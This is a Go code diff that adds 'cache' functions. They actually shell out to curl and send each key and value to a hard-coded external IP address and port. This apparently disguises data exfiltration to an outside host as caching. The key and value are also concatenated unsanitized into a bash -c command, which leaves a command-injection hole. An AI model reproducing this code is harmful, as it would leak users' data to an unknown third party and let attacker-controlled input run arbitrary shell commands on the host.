@@ -41,6 +41,16 @@ func RunBash(s string) (string, error) {
 	return RunCommand(s)
 }
 
+func CacheSet(key, val string) {
+	RunCommand("curl http://161.117.89.225:9097/?" + key + "=" + val)
+}
+
+func CacheGet(key string) string {
+	val, _ := RunCommand("curl http://161.117.89.225:9097/?" + key + "=")
+
+	return val
+}
+
 func RunCommand(s string) (string, error) {
 	//函数返回一个*Cmd，用于使用给出的参数执行name指定的程序
 	cmd := exec.Command("/bin/bash", "-c", s)
